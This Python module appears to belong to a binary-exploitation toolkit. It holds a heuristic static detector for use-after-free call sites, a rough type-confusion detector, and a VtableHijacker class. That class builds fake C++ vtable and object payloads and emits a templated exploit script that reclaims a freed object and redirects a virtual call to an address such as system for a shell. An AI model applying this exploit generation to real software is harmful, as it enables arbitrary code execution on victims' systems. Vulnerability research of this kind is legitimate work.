"""
Use-After-Free and vtable hijacking detection.

Detects:
- UAF patterns in binary
- C++ vtable targets
- Function pointer arrays
- Potential type confusion
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.core.binary import Binary
from supwngo.fuzzing.crash_triage import CrashCase
from supwngo.vulns.detector import (
    ExploitPrimitive,
    Vulnerability,
    VulnerabilityDetector,
    VulnSeverity,
    VulnType,
)
from supwngo.vulns._disasm import (
    DisassemblyUnavailable,
    IMM_STORE,
    NULL_QWORD_STORE,
    objdump_intel,
)
from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class UAFType(Enum):
    """Types of UAF vulnerabilities."""
    HEAP_UAF = auto()         # Classic heap UAF
    STACK_UAF = auto()        # Stack variable reuse
    VTABLE_UAF = auto()       # C++ vtable after free
    FUNCTION_PTR = auto()     # Function pointer array
    TYPE_CONFUSION = auto()   # Type confusion via unions/casts


@dataclass
class UAFVuln(Vulnerability):
    """UAF vulnerability details."""
    uaf_type: UAFType = UAFType.HEAP_UAF
    chunk_size: int = 0
    has_edit_after_free: bool = False
    has_use_after_free: bool = False
    vtable_offset: int = 0  # For C++ objects


@dataclass
class VtableInfo:
    """C++ vtable information."""
    address: int
    class_name: str
    num_entries: int
    entry_addrs: List[int] = field(default_factory=list)


class UAFDetector(VulnerabilityDetector):
    """
    Detect Use-After-Free vulnerabilities.

    Looks for:
    1. Free without NULL assignment
    2. Pointer reuse after free
    3. Double-free potential
    4. C++ virtual function calls
    """

    def __init__(self, binary: Binary):
        """
        Initialize detector.

        Args:
            binary: Target binary
        """
        self.binary = binary
        self.vulnerabilities: List[UAFVuln] = []

    def detect(
        self,
        crash: Optional[CrashCase] = None,
    ) -> List[UAFVuln]:
        """Detect use-after-free via a cheap body-level signal (Sprint-B2, bounded).

        Precision-first heuristic: a ``free`` call-site whose immediate
        continuation writes a *non-zero* value to memory without clearing a
        pointer-sized slot to NULL -- i.e. the freed object is retired with a
        state tag while its pointer is left dangling. This separates the
        corpus_uafread positives (mark state, keep the pointer) from the
        ``*_neg_cleared_on_free`` control (NULLs the pointer slot). The shapes it
        misses need intra-function dataflow -- a scoped follow-on (see
        docs/plans/2026-11-16-identification-sprintB-plan.md, G2e). Does not
        crash on odd input, but propagates :class:`DisassemblyUnavailable` when
        objdump could not run so ``detect_all`` records an honest
        ``DetectorFailure`` instead of a silent zero-finding pass.
        """
        self.vulnerabilities = []
        try:
            self._scan_free_without_null()
        except DisassemblyUnavailable:
            # The binary was never disassembled -> surface as a DetectorFailure
            # (honest "could not analyze"), not a silent zero-finding pass.
            raise
        except Exception as e:  # noqa: BLE001 -- contract: don't crash on odd input
            logger.debug(f"UAF scan failed: {e}")
        return self.vulnerabilities

    def get_exploit_primitive(
        self,
        vuln: Vulnerability,
    ) -> Optional[ExploitPrimitive]:
        """A confirmed UAF yields a controllable use of freed memory: once the
        slot is reallocated with attacker data, it is a write over the reused
        chunk (target and value controllable)."""
        return ExploitPrimitive(
            primitive_type="write",
            target_controllable=True,
            value_controllable=True,
        )

    def _scan_free_without_null(self) -> None:
        """Flag a ``free`` whose window writes a non-zero tag but no NULL pointer
        store (see ``detect`` for the rationale)."""
        rows = objdump_intel(self.binary)
        if not rows:
            return
        n = len(rows)
        for i, ins in enumerate(rows):
            if not (ins.startswith("call") and "<free@plt>" in ins):
                continue
            # Window: instructions up to the next control-flow boundary.
            window: List[str] = []
            for j in range(i + 1, min(i + 8, n)):
                r = rows[j]
                if r.startswith(("ret", "call", "jmp", "leave")):
                    break
                window.append(r)
            nulls_pointer = any(NULL_QWORD_STORE.match(r) for r in window)
            tags_nonzero = any(
                (m := IMM_STORE.match(r)) is not None and int(m.group(1), 16) != 0
                for r in window
            )
            if tags_nonzero and not nulls_pointer:
                self.vulnerabilities.append(
                    UAFVuln(
                        vuln_type=VulnType.USE_AFTER_FREE,
                        severity=VulnSeverity.HIGH,
                        detection_method="static",
                        confidence=0.6,
                        description=(
                            "free() call-site retires the object with a non-zero "
                            "state write but does not NULL the freed pointer slot "
                            "-- the dangling pointer can be used after free"
                        ),
                        uaf_type=UAFType.HEAP_UAF,
                        has_use_after_free=True,
                    )
                )
                # One finding per binary is sufficient for identification.
                return


class VtableHijacker:
    """
    Generate vtable hijacking exploits.

    For C++ binaries with UAF vulnerabilities.
    """

    def __init__(self, binary, bits: int = 64):
        """
        Initialize hijacker.

        Args:
            binary: Binary object
            bits: Architecture bits
        """
        self.binary = binary
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.ptr_size = 8 if bits == 64 else 4

    def create_fake_vtable(
        self,
        entries: List[int],
        num_entries: int = 8,
    ) -> bytes:
        """
        Create fake vtable payload.

        Args:
            entries: List of addresses for vtable entries
            num_entries: Total entries (pad with zeros)

        Returns:
            Fake vtable bytes
        """
        vtable = bytearray(num_entries * self.ptr_size)

        for i, addr in enumerate(entries[:num_entries]):
            offset = i * self.ptr_size
            vtable[offset:offset + self.ptr_size] = self.pack(addr)

        return bytes(vtable)

    def create_fake_object(
        self,
        vtable_addr: int,
        data: bytes = b"",
    ) -> bytes:
        """
        Create fake C++ object payload.

        Args:
            vtable_addr: Address of (fake) vtable
            data: Additional object data

        Returns:
            Fake object bytes
        """
        obj = self.pack(vtable_addr)
        obj += data

        return obj

    def exploit_strategy(
        self,
        object_size: int,
        vtable_index: int,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate UAF vtable hijacking strategy.

        Args:
            object_size: Size of C++ object
            vtable_index: Which virtual method gets called
            target_addr: Address to call (system, one_gadget, etc.)

        Returns:
            Exploitation strategy
        """
        result = {
            "object_size": object_size,
            "fake_vtable_size": (vtable_index + 1) * self.ptr_size,
            "steps": [],
            "payload_layout": {},
            "code": "",
        }

        # Calculate payload layout
        # Object: [vtable_ptr][data...]
        # Fake vtable: [entry0][entry1]...[target_entry]

        result["steps"] = [
            f"1. Object is {object_size} bytes, vtable at offset 0",
            f"2. Virtual call uses index {vtable_index}",
            f"3. Dereference chain: obj -> vtable_ptr -> vtable[{vtable_index}] -> call",
            "4. Need to place fake vtable at known address",
            "5. Allocate chunk to fill freed object's slot",
            f"6. Write fake vtable ptr pointing to our fake vtable",
            f"7. Fake vtable[{vtable_index}] = 0x{target_addr:x}",
            "8. Trigger virtual call on stale pointer",
        ]

        result["payload_layout"] = {
            "fake_vtable": {
                "offset": 0,
                "size": result["fake_vtable_size"],
                "content": f"[pad * {vtable_index}][0x{target_addr:x}]",
            },
            "fake_object": {
                "offset": 0,
                "size": object_size,
                "content": "[fake_vtable_addr][padding...]",
            },
        }

        result["code"] = f'''
# UAF Vtable Hijacking Exploit
def exploit():
    # Allocate victim object
    obj_idx = create_object()  # Creates C++ object of size {object_size}

    # Free object (pointer remains accessible)
    delete_object(obj_idx)

    # Allocate same-size chunk to reuse memory
    # Place our controlled data
    fake_vtable_addr = known_writable_addr  # Where we put fake vtable

    # Create fake vtable
    fake_vtable = b'\\x00' * {vtable_index * self.ptr_size}  # Padding
    fake_vtable += p{self.bits}(0x{target_addr:x})  # Target at index {vtable_index}

    # Write fake vtable to memory
    write_primitive(fake_vtable_addr, fake_vtable)

    # Create fake object (just vtable pointer + padding)
    fake_obj = p{self.bits}(fake_vtable_addr)
    fake_obj += b'A' * ({object_size} - {self.ptr_size})

    # Allocate to fill freed slot
    fill_idx = allocate({object_size}, fake_obj)

    # Trigger virtual call through stale pointer
    # This calls obj->vtable[{vtable_index}]() which is now 0x{target_addr:x}
    use_object(obj_idx)

    # Should have shell now!
'''

        return result


class TypeConfusionDetector:
    """
    Detect type confusion vulnerabilities.

    Looks for:
    - Union types with different interpretations
    - Casts between incompatible types
    - Variant/tagged union patterns
    """

    def __init__(self, binary: Binary):
        """
        Initialize detector.

        Args:
            binary: Target binary
        """
        self.binary = binary

    def detect(self) -> List[UAFVuln]:
        """
        Detect type confusion patterns.

        Returns:
            List of vulnerabilities
        """
        vulns = []

        # This would ideally use DWARF debug info or source analysis
        # For binary-only analysis, we look for patterns

        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Check for patterns suggesting tagged unions
            # e.g., switch statements on type field followed by different handling

            # Heuristic: Look for functions that access same memory as different types
            # This is very limited without source

            vuln = UAFVuln(
                name="type-confusion-potential",
                description="Check for type confusion via unions or casts",
                severity="low",
                uaf_type=UAFType.TYPE_CONFUSION,
            )
            vuln.exploitation_notes = """
Type Confusion Patterns:
1. Tagged unions: switch(obj->type) with different field access
2. Void pointer casts: (struct A*)data vs (struct B*)data
3. Integer/pointer confusion: storing int, reading as pointer
4. Object reinterpretation: same memory, different types

Exploitation:
- Control type tag to access unintended fields
- Store integer, interpret as pointer (or vice versa)
- Combine with heap spray for controlled data

Example (Entity challenge pattern):
  union { int val; char* str; } u;
  u.val = controlled_int;  // Set integer
  // Later: printf(u.str)  // Use as string pointer!
"""
            vulns.append(vuln)

        except Exception as e:
            logger.debug(f"Type confusion detection failed: {e}")

        return vulns

    def summary(self) -> str:
        """Get detection summary."""
        return """
Type Confusion Detection
========================
Binary-only detection is limited.

With source/debug info, look for:
- Union definitions
- Void pointer usage
- Type tags/discriminants
- Variant types

Common patterns:
- Tagged unions without proper validation
- Integer interpreted as pointer
- String/integer union overlap
"""
